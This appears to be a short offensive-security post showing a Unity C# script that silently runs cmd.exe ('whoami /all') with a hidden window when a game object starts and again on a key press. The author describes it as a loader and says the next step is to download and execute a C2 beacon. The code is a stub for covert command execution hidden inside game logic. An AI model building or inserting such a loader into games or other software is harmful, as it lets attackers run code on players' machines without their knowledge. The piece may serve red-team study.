

this is able to run cmd.exe


```C#
using UnityEngine;
using System.Diagnostics;

public class CmdLauncher : MonoBehaviour
{
    void Start()
    {
        // Run once when the GameObject is initialized
        LaunchDir();
    }

    void Update()
    {
        // Example: run whenever the player presses Space
        if (Input.GetKeyDown(KeyCode.Space))
            LaunchDir();
            print("space has been pressed");
    }

    void LaunchDir()
    {
        // Configure how to start cmd.exe
        var startInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/C whoami /all",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true,
            Verb = "runas",
            WindowStyle = ProcessWindowStyle.Hidden
        };

        // Start the process, read its output, and wait for it to finish
        using (var process = Process.Start(startInfo))
        {
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Log the directory listing to the Unity Console
            UnityEngine.Debug.Log(output);
        }
    }
}

```



next step would be to be able to download my beacon and execute it!, that can easily be down in different ways. essentially here we are using the C# script as our loader.

```

```